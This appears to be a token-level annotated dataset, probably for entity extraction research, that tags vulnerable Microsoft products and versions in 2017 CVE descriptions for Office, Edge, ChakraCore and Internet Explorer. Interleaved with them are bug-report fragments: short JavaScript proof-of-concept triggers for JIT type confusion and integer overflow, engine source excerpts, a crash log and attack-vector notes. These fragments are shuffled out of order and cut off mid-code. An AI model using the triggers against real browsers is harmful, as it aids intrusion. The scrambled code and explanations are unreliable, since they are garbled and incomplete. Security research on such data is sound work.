Microsoft S-vulnerable_software pair_0
Excel S-vulnerable_software pair_0
2007 S-vulnerable_version pair_0
Service S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
3 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
Excel S-vulnerable_software pair_1
2010 S-vulnerable_version pair_1
Service S-vulnerable_version pair_1
Pack S-vulnerable_version pair_1
2 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
Excel S-vulnerable_software pair_2
2013 S-vulnerable_version pair_2
Service S-vulnerable_version pair_2
Pack S-vulnerable_version pair_2
1 S-vulnerable_version pair_2
, O O
Microsoft S-vulnerable_software pair_3
Excel S-vulnerable_software pair_3
2013 S-vulnerable_version pair_3
RT S-vulnerable_version pair_3
Service S-vulnerable_version pair_3
Pack S-vulnerable_version pair_3
1 S-vulnerable_version pair_3
, O O
Microsoft S-vulnerable_software pair_4
Excel S-vulnerable_software pair_4
2016 S-vulnerable_version pair_4
, O O
Microsoft S-vulnerable_software pair_5
Office S-vulnerable_software pair_5
Compatibility S-vulnerable_software pair_5
Pack S-vulnerable_software pair_5
Service S-vulnerable_version pair_5
Pack S-vulnerable_version pair_5
3 S-vulnerable_version pair_5
, O O
and O O
Microsoft S-vulnerable_software pair_6
Excel S-vulnerable_software pair_6
Viewer O O
2007 S-vulnerable_version pair_6
Service S-vulnerable_version pair_6
Pack S-vulnerable_version pair_6
3 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
run O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
by O O
failing O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Excel O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
Server S-vulnerable_version pair_2
, O O
version S-vulnerable_version pair_2
1709 S-vulnerable_version pair_2
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
and O O
CVE-2017-11871 O O
. O O

The O O
PoC O O
shows O O
that O O
it O O
can O O
result O O
in O O
type O O
confusion O O
. O O

So O O
it O O
fails O O
to O O
detect O O
if O O
the O O
type O O
of O O
b O O
was O O
changed O O
after O O
the O O
OP_Memset O O
called O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
, O O
version S-vulnerable_version pair_1
1709 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
and O O
CVE-2017-11873 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

Source O O
: O O
the O O
following O O
JavaScript O O
code O O
, O O
both O O
of O O
the O O
print O O
calls O O
must O O
print O O
out O O
undefined O O
because O O
of O O
x O O
is O O
a O O
formal O O
parameter O O
. O O

But O O
the O O
method O O
can O O
t O O
detect O O
the O O
above O O
buggy O O
case O O
, O O
so O O
it O O
may O O
end O O
up O O
wrongly O O
optimizing O O
arguments O O
. O O

But O O
the O O
second O O
print O O
call O O
prints O O
out O O
function O O
x O O

function O O
f O O
( O O
x O O
) O O
{ O O
print O O
( O O
x O O
) O O
; O O
{ O O
function O O
x O O
print O O
( O O
x O O
) O O
; O O
} O O
The O O
following O O
code O O
in O O
PreVisitFunction O O
is O O
used O O
to O O
decide O O
how O O
to O O
optimize O O
arguments O O
. O O

This O O
bug O O
may O O
lead O O
to O O
type O O
confusion O O
in O O
JITed O O
code O O
. O O

function O O
f O O
( O O
x O O
) O O
{ O O
x O O
= O O
1 O O
; O O
} O O
PoC O O
: O O
function O O
f O O
( O O
x O O
) O O
{ O O
arguments O O
; O O
{ O O
function O O
x O O
for O O
( O O
let O O
i O O
= O O
0 O O
; O O
i O O
< O O
10000 O O
; O O
i++ O O
) O O
f O O
( O O
) O O
; O O

bool O O
doStackArgsOpt O O
= O O
( O O
! O O
pnode- O O
> O O
sxFnc.HasAnyWriteToFormals O O
( O O
) O O
|| O O
funcInfo- O O
> O O
GetIsStrictMode O O
( O O
) O O
) O O
; O O
HasAnyWriteToFormals O O
set O O
by O O
Parser O O
: O O
:BindPidRefsInScope O O
returns O O
true O O
in O O
the O O
following O O
example O O
code O O
where O O
x O O
is O O
formal O O
. O O

Microsoft O O
Edge O O
Chakra O O
JIT O O
- O O
Incorrect O O
Function O O
Declaration O O
Scope O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Microsoft O O
browsers O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
Server S-vulnerable_version pair_2
, O O
version S-vulnerable_version pair_2
1709 S-vulnerable_version pair_2
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1709 S-vulnerable_version pair_0
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
, O O
version S-vulnerable_version pair_1
1709 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
Server S-vulnerable_version pair_2
, O O
version S-vulnerable_version pair_2
1709 S-vulnerable_version pair_2
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

PoC O O
: O O
function O O
f O O
( O O
) O O
{ O O
let O O
arr O O
= O O
new O O
Uint32Array O O
( O O
0x1000 O O
) O O
; O O
for O O
( O O
let O O
i O O
= O O
0 O O
; O O
i O O
< O O
0x7fffffff O O
; O O
) O O
{ O O
arr O O
[ O O
++i O O
] O O
= O O
0x1234 O O
; O O
} O O
} O O
f O O
( O O
) O O
; O O

So O O
it O O
may O O
fail O O
to O O
check O O
integer O O
overflow O O
on O O
64-bit O O
system O O
. O O

But O O
the O O
size O O
of O O
IntConstType O O
equals O O
to O O
the O O
size O O
of O O
pointer O O
, O O
and O O
the O O
offset O O
variable O O
is O O
used O O
as O O
a O O
32-bit O O
integer O O
. O O

void O O
Lowerer O O
: O O
:LowerBoundCheck O O
( O O
IR O O
: O O
:Instr O O
const O O
instr O O
if O O
( O O
rightOpnd- O O
> O O
IsIntConstOpnd O O
( O O
) O O
) O O
{ O O
IntConstType O O
newOffset O O
; O O
if O O
( O O
! O O
IntConstMath O O
: O O
:Add O O
( O O
offset O O
, O O
rightOpnd- O O
> O O
AsIntConstOpnd O O
( O O
) O O
- O O
> O O
GetValue O O
( O O
) O O
, O O
& O O
newOffset O O
) O O
) O O
( O O
a O O
) O O
{ O O
offset O O
= O O
newOffset O O
; O O
rightOpnd O O
= O O
nullptr O O
; O O
offsetOpnd O O
= O O
nullptr O O
if O O
( O O
! O O
rightOpnd O O
) O O
{ O O
rightOpnd O O
= O O
IR O O
: O O
:IntConstOpnd O O
: O O
:New O O
( O O
offset O O
, O O
TyInt32 O O
, O O
func O O
At O O
( O O
a O O
) O O
, O O
it O O
uses O O
IntConstMath O O
: O O
:Add O O
to O O
check O O
integer O O
overflow O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

ChakraCore O O
and O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Microsoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Microsoft O O
browsers O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11855 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11856 O O
. O O

Debug O O
log O O
: O O
( O O
a3c.bd8 O O
) O O
: O O
Access O O
violation O O
- O O
code O O
c0000005 O O
( O O
first O O
chance O O
) O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

- O O
[ O O
currently O O
untested O O
] O O
An O O
attacker O O
on O O
the O O
local O O
network O O
could O O
exploit O O
this O O
issue O O
by O O
posing O O
as O O
a O O
WPAD O O
( O O
Web O O
Proxy O O
Auto-Discovery O O
) O O
host O O
and O O
sending O O
a O O
malicious O O
wpad.dat O O
file O O
to O O
the O O
victim O O
. O O

jscript O O
! O O
InvokeDispatch+0xbd O O
: O O
00007ffa`e45a45fd O O
488b4008 O O
mov O O
rax O O
, O O
qword O O
ptr O O
[ O O
rax+8 O O
] O O
ds:0000004e`00610056 O O

This O O
issue O O
could O O
potentially O O
be O O
exploited O O
through O O
multiple O O
vectors O O
: O O
- O O
By O O
opening O O
a O O
malicious O O
web O O
page O O
in O O
Internet O O
Explorer O O
. O O

The O O
issue O O
has O O
been O O
verified O O
on O O
64-bit O O
Windows O O
10 O O
with O O
the O O
most O O
recent O O
patches O O
applied O O
. O O

Thus O O
if O O
NameTBL O O
: O O
:GetVal O O
( O O
) O O
returns O O
1 O O
, O O
ConvertToScalar O O
( O O
) O O
is O O
going O O
to O O
be O O
called O O
with O O
invalid O O
arguments O O
. O O

However O O
in O O
this O O
case O O
NameTBL O O
: O O
:GetVal O O
( O O
) O O
will O O
actually O O
return O O
1 O O
. O O

Depending O O
on O O
the O O
perceived O O
( O O
uninitialized O O
) O O
type O O
of O O
length O O
VAR O O
, O O
this O O
might O O
lead O O
to O O
exploitable O O
conditions O O
including O O
calling O O
a O O
virtual O O
method O O
on O O
the O O
uninitialized O O
pointer O O
( O O
see O O
below O O
) O O
. O O

Also O O
, O O
in O O
this O O
case O O
, O O
the O O
length O O
VAR O O
is O O
not O O
going O O
to O O
be O O
initialized O O
. O O

PoC O O
for O O
Internet O O
Explorer O O
( O O
tested O O
on O O
IE S-vulnerable_software pair_0
11 S-vulnerable_version pair_0
with O O
a O O
64-bit O O
tab O O
process O O
. O O

Microsoft S-vulnerable_software pair_0
Word S-vulnerable_software pair_0
2007 S-vulnerable_version pair_0
Service S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
3 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
Word S-vulnerable_software pair_1
2010 S-vulnerable_version pair_1
Service S-vulnerable_version pair_1
Pack S-vulnerable_version pair_1
2 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
Office S-vulnerable_software pair_2
2010 S-vulnerable_version pair_2
Service S-vulnerable_version pair_2
Pack S-vulnerable_version pair_2
2 S-vulnerable_version pair_2
, O O
and O O
Microsoft S-vulnerable_software pair_3
Office S-vulnerable_software pair_3
Compatibility S-vulnerable_software pair_3
Pack S-vulnerable_software pair_3
Service S-vulnerable_version pair_3
Pack S-vulnerable_version pair_3
3 S-vulnerable_version pair_3
allow O O
an O O
attacker O O
to O O
run O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
by O O
failing O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Word O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ChakraCore O O
and O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Microsoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Microsoft O O
Edge O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ChakraCore O O
and O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Microsoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

So O O
it O O
may O O
fail O O
to O O
detect O O
type O O
changes O O
. O O

But O O
in O O
the O O
above O O
snippet O O
, O O
it O O
emits O O
the O O
